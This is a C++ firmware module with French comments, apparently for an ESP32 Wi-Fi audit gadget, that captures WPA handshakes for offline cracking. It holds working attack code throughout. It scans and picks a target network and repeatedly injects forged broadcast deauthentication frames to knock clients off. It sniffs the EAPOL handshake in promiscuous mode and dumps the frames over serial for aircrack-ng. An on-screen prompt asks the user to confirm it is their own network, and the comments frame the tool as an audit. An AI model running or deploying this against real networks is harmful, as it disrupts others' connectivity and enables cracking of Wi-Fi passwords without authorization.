// ---------------------------------------------------------------------------
//  handshake.cpp — capture d'un handshake WPA (EAPOL) pour crack HORS-LIGNE.
//
//  La bonne méthode d'audit WPA : au lieu de tester des clés EN LIGNE (chaque
//  essai ~4 s, cf. Auth Test / Brute Force), on capture UNE FOIS le handshake
//  à quatre voies (EAPOL) échangé quand un client se (re)connecte, puis on
//  casse HORS-LIGNE sur le deck avec aircrack-ng (des milliers de clés/s).
//
//  Ce module :
//    1. scanne, laisse choisir une cible (comme Auth Test) ;
//    2. APRÈS confirmation d'autorisation (émission active) : écoute en
//       promiscuous sur le canal de la cible ET envoie des deauth ciblés pour
//       forcer une reconnexion — c'est la reconnexion qui rejoue le handshake ;
//    3. capture les trames EAPOL (+ une balise, pour le SSID) de la cible ;
//    4. dès EAPOL >= 2, `RIGHT` dumpe les trames sur le port série au protocole
//       texte GBHS-*, que `ghost-crack capture` transforme en vrai .pcap.
//
//  Il ne stocke rien en clair d'exploitable seul : un handshake capturé ne
//  livre la clé que si un dictionnaire la contient. Une clé forte résiste —
//  c'est le bon résultat d'un audit. Réimplémentation clean-room.
//
//  NB : l'override esp_wifi qui autorise l'injection de trames brutes
//  (ieee80211_raw_frame_sanity_check) est défini une seule fois, dans
//  deauther.cpp ; il vaut pour tout le firmware, on ne le redéfinit pas ici.
// ---------------------------------------------------------------------------
#include "config.h"
#include "theme.h"
#include "authgate.h"
#include "handshake.h"

namespace Handshake {

// --- Buffer de capture ------------------------------------------------------
//  Un handshake EAPOL = 4 trames ; on garde aussi une balise (SSID) et un peu
//  de marge. Chaque trame 802.11 utile ici (< ~256 o) est copiée telle quelle.
static const int MAX_PKTS = 8;
static const int MAX_LEN  = 256;

struct Pkt {
    uint32_t ts;                 // microsecondes (rx_ctrl.timestamp)
    uint16_t len;
    uint8_t  data[MAX_LEN];
};
static Pkt   pkts[MAX_PKTS];
static volatile int pktCount = 0;
static volatile int eapolCount = 0;
static bool haveBeacon = false;

static uint8_t targetBssid[6];
static uint8_t targetChannel = 1;
static String  targetSsid;

// --- États ------------------------------------------------------------------
enum State { LIST, CAPTURE, DUMPED };
static State state = LIST;

static int netCount = 0;
static int sel = 0, top = 0;
static const int ROWS = 5;

static unsigned long lastPress = 0;
static const unsigned long debounce = 200;
static unsigned long lastDeauth = 0;
static unsigned long lastDraw = 0;
static uint32_t deauthSent = 0;

// --- Capture (callback promiscuous) -----------------------------------------
static inline bool sameBssid(const uint8_t *a) {
    return memcmp(a, targetBssid, 6) == 0;
}

// Copie une trame dans le buffer si la place le permet.
static void store(const uint8_t *p, int len, uint32_t ts) {
    if (pktCount >= MAX_PKTS) return;
    if (len > MAX_LEN) len = MAX_LEN;
    Pkt &e = pkts[pktCount];
    e.ts = ts;
    e.len = (uint16_t)len;
    memcpy(e.data, p, len);
    pktCount++;
}

static void onPacket(void *buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *ppkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = ppkt->payload;
    int len = ppkt->rx_ctrl.sig_len;
    if (len < 24) return;

    const uint8_t ftype   = (p[0] >> 2) & 0x03;   // 0 gestion, 1 contrôle, 2 données
    const uint8_t subtype = (p[0] >> 4) & 0x0F;

    // On ne garde que ce qui concerne la cible (addr1/addr2/addr3).
    if (!sameBssid(p + 4) && !sameBssid(p + 10) && !sameBssid(p + 16)) return;

    // Balise : sert à récupérer le SSID côté deck (et à prouver la présence AP).
    if (ftype == 0 && subtype == 8) {
        if (!haveBeacon) { store(p, len, ppkt->rx_ctrl.timestamp); haveBeacon = true; }
        return;
    }

    // Données : on cherche une trame EAPOL (EtherType 0x888E après l'en-tête
    // 802.11 + LLC/SNAP). En-tête = 24 o, +2 si QoS (sous-type données >= 8).
    if (ftype == 2) {
        int hdr = 24;
        if (subtype & 0x08) hdr += 2;             // QoS Data
        // LLC/SNAP (8 o) : AA AA 03 00 00 00 <ethertype>. EAPOL = 88 8E.
        if (len < hdr + 8) return;
        if (p[hdr + 6] == 0x88 && p[hdr + 7] == 0x8E) {
            store(p, len, ppkt->rx_ctrl.timestamp);
            eapolCount++;
        }
    }
}

// --- Émission deauth (force la reconnexion) ---------------------------------
//  Deauth diffusé « depuis l'AP » vers tous ses clients : à la reconnexion,
//  le client rejoue le handshake EAPOL qu'on écoute. L'override qui autorise
//  l'injection est dans deauther.cpp.
static void sendDeauth() {
    uint8_t frame[26] = {
        0xC0, 0x00,                         // type/sous-type C0 : deauth
        0x00, 0x00,                         // duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // dest : broadcast (tous les clients)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // src  : AP (rempli ci-dessous)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // bssid: AP
        0x00, 0x00,                         // seq
        0x07, 0x00                          // reason code 7
    };
    memcpy(frame + 10, targetBssid, 6);
    memcpy(frame + 16, targetBssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    deauthSent++;
}

// --- Dump série (protocole GBHS-*) ------------------------------------------
//  Lu par `ghost-crack capture`, qui en fait un .pcap (DLT 105, 802.11).
//    GBHS-BEGIN <bssid-hex> <canal> <ssid>
//    GBHS-PKT   <ts-microsecondes> <hexbytes>
//    GBHS-END   <nombre>
static void dumpSerial() {
    char bssid[13];
    snprintf(bssid, sizeof(bssid), "%02X%02X%02X%02X%02X%02X",
             targetBssid[0], targetBssid[1], targetBssid[2],
             targetBssid[3], targetBssid[4], targetBssid[5]);
    Serial.println();
    Serial.printf("GBHS-BEGIN %s %u %s\n", bssid, (unsigned)targetChannel,
                  targetSsid.c_str());
    for (int i = 0; i < pktCount; i++) {
        Serial.printf("GBHS-PKT %lu ", (unsigned long)pkts[i].ts);
        for (int j = 0; j < pkts[i].len; j++) Serial.printf("%02X", pkts[i].data[j]);
        Serial.println();
    }
    Serial.printf("GBHS-END %d\n", pktCount);
}

// --- Affichages -------------------------------------------------------------
static void drawList() {
    u8g2.clearBuffer();
    gbHeader("Handshake");
    u8g2.setFont(u8g2_font_5x8_tr);
    if (netCount == 0) {
        u8g2.drawStr(10, 30, "No networks.");
    } else {
        for (int i = 0; i < ROWS; i++) {
            int idx = top + i;
            if (idx >= netCount) break;
            int y = 22 + i * 8;
            if (idx == sel) u8g2.drawStr(0, y, ">");
            String ssid = WiFi.SSID(idx).substring(0, 16);
            bool open = (WiFi.encryptionType(idx) == WIFI_AUTH_OPEN);
            u8g2.drawStr(8, y, ssid.c_str());
            if (open) u8g2.drawStr(104, y, "open");
        }
    }
    u8g2.drawStr(0, 63, "U/D  RIGHT capture  LEFT");
    u8g2.sendBuffer();
    setNeoPixelColour("scan");
}

static void drawCapture() {
    u8g2.clearBuffer();
    gbHeader("Handshake");
    u8g2.setFont(u8g2_font_5x8_tr);
    String t = "SSID: " + targetSsid.substring(0, 16);
    u8g2.drawStr(0, 24, t.c_str());
    char buf[26];
    snprintf(buf, sizeof(buf), "Ch %u  deauth %lu", (unsigned)targetChannel,
             (unsigned long)deauthSent);
    u8g2.drawStr(0, 34, buf);
    snprintf(buf, sizeof(buf), "EAPOL: %d  beacon:%s", eapolCount,
             haveBeacon ? "y" : "n");
    u8g2.drawStr(0, 44, buf);

    bool got = eapolCount >= 2;
    u8g2.drawStr(0, 54, got ? "HANDSHAKE CAPTURED" : "Waiting for client...");
    u8g2.drawStr(0, 63, got ? "RIGHT: dump   LEFT: back" : "LEFT: back");
    u8g2.sendBuffer();
    setNeoPixelColour(got ? "ok" : "attack");
}

static void drawDumped() {
    u8g2.clearBuffer();
    gbHeader("Handshake");
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 28, "Dumped on serial.");
    u8g2.setFont(u8g2_font_5x8_tr);
    char buf[26];
    snprintf(buf, sizeof(buf), "%d frames -> ghost-crack", pktCount);
    u8g2.drawStr(0, 42, buf);
    u8g2.drawStr(0, 63, "LEFT: back");
    u8g2.sendBuffer();
    setNeoPixelColour("ok");
}

// --- Cycle de vie -----------------------------------------------------------
static void startCapture() {
    pktCount = 0;
    eapolCount = 0;
    haveBeacon = false;
    deauthSent = 0;
    lastDeauth = 0;

    // Mode réceptif + injection : STA sans association, promiscuous, canal figé
    // sur celui de la cible (pas de hop : on veut TOUT le handshake sur un canal).
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&onPacket);
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

    state = CAPTURE;
    drawCapture();
}

static void stopRadio() {
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    setNeoPixelColour("0");
}

void setup() {
    state = LIST;
    sel = top = 0;
    pktCount = 0;
    eapolCount = 0;
    haveBeacon = false;
    deauthSent = 0;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    netCount = WiFi.scanNetworks();
    drawList();
}

bool loop() {
    unsigned long now = millis();

    // --- CAPTURE ------------------------------------------------------------
    if (state == CAPTURE) {
        // Deauth périodique tant que le handshake n'est pas complet : c'est la
        // reconnexion forcée qui rejoue l'EAPOL. On s'arrête dès qu'on l'a.
        if (eapolCount < 2 && now - lastDeauth > 1500) {
            for (int i = 0; i < 3; i++) { sendDeauth(); delay(2); }
            lastDeauth = now;
        }
        if (now - lastDraw > 400) { drawCapture(); lastDraw = now; }

        if (digitalRead(BTN_PIN_RIGHT) == LOW) {
            while (digitalRead(BTN_PIN_RIGHT) == LOW);
            if (eapolCount >= 2) {            // dump seulement si on a de quoi
                esp_wifi_set_promiscuous(false);
                dumpSerial();
                state = DUMPED;
                drawDumped();
            }
        } else if (digitalRead(BTN_PIN_LEFT) == LOW) {
            while (digitalRead(BTN_PIN_LEFT) == LOW);
            stopRadio();
            return true;
        }
        return false;
    }

    // --- DUMPED -------------------------------------------------------------
    if (state == DUMPED) {
        if (digitalRead(BTN_PIN_LEFT) == LOW) {
            while (digitalRead(BTN_PIN_LEFT) == LOW);
            stopRadio();
            return true;
        }
        return false;
    }

    // --- LIST ---------------------------------------------------------------
    if (now - lastPress < debounce) return false;

    if (digitalRead(BUTTON_UP_PIN) == LOW) {
        lastPress = now;
        if (sel > 0) { sel--; if (sel < top) top = sel; }
        drawList();
        while (digitalRead(BUTTON_UP_PIN) == LOW);
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
        lastPress = now;
        if (sel < netCount - 1) { sel++; if (sel >= top + ROWS) top = sel - ROWS + 1; }
        drawList();
        while (digitalRead(BUTTON_DOWN_PIN) == LOW);
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW && netCount > 0) {
        lastPress = now;
        while (digitalRead(BTN_PIN_RIGHT) == LOW);
        targetSsid = WiFi.SSID(sel);
        memcpy(targetBssid, WiFi.BSSID(sel), 6);
        targetChannel = WiFi.channel(sel);
        if (WiFi.encryptionType(sel) == WIFI_AUTH_OPEN) {
            // Réseau ouvert : pas de handshake WPA à capturer.
            drawList();
            return false;
        }
        // Émission active (deauth) : confirmation obligatoire avant de démarrer.
        if (AuthGate::confirm("Handshake", "Forces a reconnect on", "YOUR OWN network.")) {
            startCapture();
        } else {
            drawList();
        }
    } else if (digitalRead(BTN_PIN_LEFT) == LOW) {
        lastPress = now;
        while (digitalRead(BTN_PIN_LEFT) == LOW);
        WiFi.mode(WIFI_OFF);
        setNeoPixelColour("0");
        return true;
    }
    return false;
}

}  // namespace Handshake
